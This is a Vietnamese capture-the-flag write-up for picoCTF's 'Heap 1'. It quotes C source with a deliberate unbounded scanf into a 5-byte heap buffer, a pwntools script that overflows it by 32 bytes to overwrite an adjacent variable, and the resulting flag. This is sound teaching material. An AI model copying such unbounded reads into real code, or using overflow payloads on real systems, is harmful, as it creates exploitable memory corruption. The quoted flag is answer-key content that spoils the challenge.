# Heap 1
Challenge này cho chúng ta 2 file, một file binary `chall` và một file .c `chall.c`.

Mở file `chall.c` thì ta có source code của challenge này như sau:

``` c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define FLAGSIZE_MAX 64
// amount of memory allocated for input_data
#define INPUT_DATA_SIZE 5
// amount of memory allocated for safe_var
#define SAFE_VAR_SIZE 5

int num_allocs;
char *safe_var;
char *input_data;

void check_win() {
    if (!strcmp(safe_var, "pico")) {
        printf("\nYOU WIN\n");

        // Print flag
        char buf[FLAGSIZE_MAX];
        FILE *fd = fopen("flag.txt", "r");
        fgets(buf, FLAGSIZE_MAX, fd);
        printf("%s\n", buf);
        fflush(stdout);

        exit(0);
    } else {
        printf("Looks like everything is still secure!\n");
        printf("\nNo flage for you :(\n");
        fflush(stdout);
    }
}

void print_menu() {
    printf("\n1. Print Heap:\t\t(print the current state of the heap)"
           "\n2. Write to buffer:\t(write to your own personal block of data "
           "on the heap)"
           "\n3. Print safe_var:\t(I'll even let you look at my variable on "
           "the heap, "
           "I'm confident it can't be modified)"
           "\n4. Print Flag:\t\t(Try to print the flag, good luck)"
           "\n5. Exit\n\nEnter your choice: ");
    fflush(stdout);
}

void init() {
    printf("\nWelcome to heap1!\n");
    printf(
        "I put my data on the heap so it should be safe from any tampering.\n");
    printf("Since my data isn't on the stack I'll even let you write whatever "
           "info you want to the heap, I already took care of using malloc for "
           "you.\n\n");
    fflush(stdout);
    input_data = malloc(INPUT_DATA_SIZE);
    strncpy(input_data, "pico", INPUT_DATA_SIZE);
    safe_var = malloc(SAFE_VAR_SIZE);
    strncpy(safe_var, "bico", SAFE_VAR_SIZE);
}

void write_buffer() {
    printf("Data for buffer: ");
    fflush(stdout);
    scanf("%s", input_data);
}

void print_heap() {
    printf("Heap State:\n");
    printf("+-------------+----------------+\n");
    printf("[*] Address   ->   Heap Data   \n");
    printf("+-------------+----------------+\n");
    printf("[*]   %p  ->   %s\n", input_data, input_data);
    printf("+-------------+----------------+\n");
    printf("[*]   %p  ->   %s\n", safe_var, safe_var);
    printf("+-------------+----------------+\n");
    fflush(stdout);
}

int main(void) {

    // Setup
    init();
    print_heap();

    int choice;

    while (1) {
        print_menu();
	if (scanf("%d", &choice) != 1) exit(0);

        switch (choice) {
        case 1:
            // print heap
            print_heap();
            break;
        case 2:
            write_buffer();
            break;
        case 3:
            // print safe_var
            printf("\n\nTake a look at my variable: safe_var = %s\n\n",
                   safe_var);
            fflush(stdout);
            break;
        case 4:
            // Check for win condition
            check_win();
            break;
        case 5:
            // exit
            return 0;
        default:
            printf("Invalid choice\n");
            fflush(stdout);
        }
    }
}
```

Ta thấy chương trình sẽ chạy như sau:
- Khởi tạo heap bằng cách gọi hàm `init()`
- In ra nội dung của heap bằng cách gọi hàm `print_heap()`
- Khởi tạo menu bằng cách gọi hàm `print_menu()`
- Dựa vào input mà người dùng nhập vào, thực hiện các thao tác khác nhau với heap.

Ta thấy nếu nhập số `4` thì hàm `check_win()` sẽ được gọi. Nhìn vào hàm `check_win()`, ta thấy:

``` c
void check_win() {
    if (!strcmp(safe_var, "pico")) {
        printf("\nYOU WIN\n");

        // Print flag
        char buf[FLAGSIZE_MAX];
        FILE *fd = fopen("flag.txt", "r");
        fgets(buf, FLAGSIZE_MAX, fd);
        printf("%s\n", buf);
        fflush(stdout);

        exit(0);
    } else {
        printf("Looks like everything is still secure!\n");
        printf("\nNo flage for you :(\n");
        fflush(stdout);
    }
}
```

Ta thấy hàm sẽ in flag nếu `safe_var` bằng với chuỗi `pico`. Ta có `safe_var` được khởi tạo ban đầu là `bico`. Ta sẽ cố gắng làm cho `save_var` bằng với chuỗi `pico`.

Nhìn vào hàm `write_buffer()` ta thấy rằng việc nhập vào không giới hạn kí tự (Buffer overflow).

``` c
void write_buffer() {
    printf("Data for buffer: ");
    fflush(stdout);
    scanf("%s", input_data);
}
```

Khởi chạy local:

![image](https://github.com/user-attachments/assets/a8cd71d5-ad42-422d-a695-003517818a88)

Ở địa chỉ `0x64174383d6b0` đang lưu trữ chuỗi pico (input được nhập vào sẽ lưu trữ từ đây). Và địa chỉ `safe_var` trỏ đến là `0x64174383d6d0` đang lưu trữ chuỗi bico. Ta thấy offset là 32 bytes, ta sẽ thử nhập 32 kí tự `a` và nhập chuỗi pico ở cuối.

![image](https://github.com/user-attachments/assets/ce1ff2f7-278b-4f44-9661-804d938de6b1)

Ta thấy rằng vùng nhớ trên heap mà `safe_var` trỏ đến đã bị ghi đè thành chuỗi `pico`.

Thực hiện print flag (số 4)

![image](https://github.com/user-attachments/assets/394f4402-341b-404f-95ca-ac8a792be744)

Tôi `WIN` =))))))). Và tôi có file exploit như sau:

``` python 
from pwn import *

#p = process('./chall')
p = remote('tethys.picoctf.net', 57638)
write = b'2'
flag = b'4'
payload = 32 * 'a'
payload += "pico"
p.sendline(write)
p.sendline(payload)
p.sendline(flag)
p.interactive()
```

Và ta có flag:

``` 
picoCTF{starting_to_get_the_hang_21306688}
```
